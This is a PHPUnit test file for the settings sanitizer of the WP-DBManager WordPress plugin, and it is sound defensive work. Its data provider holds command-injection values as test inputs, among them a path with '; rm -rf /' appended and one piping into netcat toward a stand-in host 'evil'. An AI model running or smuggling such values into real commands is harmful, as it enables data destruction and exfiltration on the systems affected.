<?php
/**
 * The Settings API screen.
 *
 * @package WP-DBManager
 */

/**
 * The sanitize callback is the whole safety net for this screen, so it is
 * tested against the values a browser actually sends: strings, every time.
 */
class Test_DBManager_Settings extends DBManager_TestCase {

	/**
	 * A full, valid submission round-trips unchanged.
	 */
	public function test_valid_submission_is_stored() {
		$input = array(
			'mysqldumppath'          => '/usr/bin/mysqldump',
			'mysqlpath'              => '/usr/bin/mysql',
			'path'                   => $this->backup_dir,
			'max_backup'             => '7',
			'backup'                 => '2',
			'backup_gzip'            => '0',
			'backup_period'          => '86400',
			'backup_email'           => 'harness@example.com',
			'backup_email_attach'    => '0',
			'backup_email_from'      => 'from@example.com',
			'backup_email_from_name' => 'Harness Sender',
			'backup_email_subject'   => '%SITE_NAME% dump %POST_DATE%',
			'optimize'               => '5',
			'optimize_period'        => '3600',
			'repair'                 => '4',
			'repair_period'          => '604800',
			'hide_admin_notices'     => '1',
		);

		$result = DBManager_Settings::sanitize( $input );

		$this->assertSame( 7, $result['max_backup'] );
		$this->assertSame( 2, $result['backup'] );
		$this->assertSame( 0, $result['backup_gzip'] );
		$this->assertSame( 86400, $result['backup_period'] );
		$this->assertSame( 'harness@example.com', $result['backup_email'] );
		$this->assertSame( 0, $result['backup_email_attach'] );
		$this->assertSame( 'Harness Sender', $result['backup_email_from_name'] );
		$this->assertSame( '%SITE_NAME% dump %POST_DATE%', $result['backup_email_subject'] );
		$this->assertSame( 3600, $result['optimize_period'] );
		$this->assertSame( 604800, $result['repair_period'] );
		$this->assertSame( 1, $result['hide_admin_notices'] );
		$this->assertSame( $this->backup_dir, $result['path'] );
	}

	/**
	 * A backup path that does not resolve is refused and the old one kept.
	 */
	public function test_unresolvable_backup_path_is_refused() {
		$result = DBManager_Settings::sanitize( array( 'path' => '/no/such/directory/anywhere' ) );

		$this->assertSame( $this->backup_dir, $result['path'] );
		$this->assertNotEmpty( get_settings_errors( DBManager_Options::OPTION ) );
	}

	/**
	 * Shell metacharacters in either binary path are refused.
	 *
	 * @dataProvider data_dangerous_paths
	 *
	 * @param string $key   Setting to poison.
	 * @param string $value Submitted value.
	 */
	public function test_dangerous_binary_paths_are_refused( $key, $value ) {
		$before = DBManager_Options::get( $key );

		$result = DBManager_Settings::sanitize( array( $key => $value ) );

		$this->assertSame( $before, $result[ $key ] );
	}

	/**
	 * Paths that must never reach a shell command.
	 *
	 * @return array
	 */
	public function data_dangerous_paths() {
		return array(
			'command chained onto mysqldump' => array( 'mysqldumppath', '/usr/bin/mysqldump; rm -rf /' ),
			'pipe onto mysql'                => array( 'mysqlpath', '/usr/bin/mysql|nc evil 1234' ),
			'redirect onto mysqldump'        => array( 'mysqldumppath', '/usr/bin/mysqldump > /tmp/x' ),
			'quoted argument on mysql'       => array( 'mysqlpath', '/usr/bin/mysql "x"' ),
		);
	}

	/**
	 * An interval the screen does not offer is refused rather than stored.
	 *
	 * This is the failure the skill calls out by name: a setting that reports
	 * "saved" and then silently reverts, because the screen and the sanitizer
	 * disagreed about the list of acceptable values. Both read
	 * DBManager_Options::periods(), so they cannot.
	 */
	public function test_unknown_interval_is_refused() {
		$before = DBManager_Options::get( 'backup_period' );

		$result = DBManager_Settings::sanitize( array( 'backup_period' => '999' ) );

		$this->assertSame( $before, $result['backup_period'] );
	}

	/**
	 * Every interval the screen offers is accepted.
	 */
	public function test_offered_intervals_are_all_accepted() {
		foreach ( array_keys( DBManager_Options::periods() ) as $seconds ) {
			$result = DBManager_Settings::sanitize( array( 'backup_period' => (string) $seconds ) );

			$this->assertSame( $seconds, $result['backup_period'], 'Interval ' . $seconds . ' was rejected.' );
		}
	}

	/**
	 * Saving one part of the screen does not blank the rest.
	 */
	public function test_partial_submission_keeps_untouched_keys() {
		$result = DBManager_Settings::sanitize( array( 'max_backup' => '3' ) );

		$this->assertSame( 3, $result['max_backup'] );
		$this->assertSame( DBManager_Options::get( 'backup_email_subject' ), $result['backup_email_subject'] );
		$this->assertSame( DBManager_Options::get( 'mysqlpath' ), $result['mysqlpath'] );
	}

	/**
	 * Anything that is not an array leaves the settings alone.
	 */
	public function test_non_array_input_is_ignored() {
		$this->assertSame( DBManager_Options::get(), DBManager_Settings::sanitize( 'nonsense' ) );
		$this->assertSame( DBManager_Options::get(), DBManager_Settings::sanitize( null ) );
	}

	/**
	 * A negative maximum cannot be stored.
	 */
	public function test_counts_cannot_go_negative() {
		$result = DBManager_Settings::sanitize( array( 'max_backup' => '-5' ) );

		$this->assertSame( 0, $result['max_backup'] );
	}

	/**
	 * Saving flushes the cached folder reachability answer.
	 *
	 * The backup folder may have moved, so the cached verdict is about
	 * somewhere else now.
	 */
	public function test_saving_flushes_the_reachability_cache() {
		set_transient( DBManager_Folder::TRANSIENT, 'protected', HOUR_IN_SECONDS );

		DBManager_Settings::sanitize( array( 'max_backup' => '4' ) );

		$this->assertFalse( get_transient( DBManager_Folder::TRANSIENT ) );
	}

	/**
	 * The option is registered against the group the screen posts to.
	 */
	public function test_option_is_registered() {
		DBManager_Settings::register();

		$registered = get_registered_settings();

		$this->assertArrayHasKey( DBManager_Options::OPTION, $registered );
	}
}
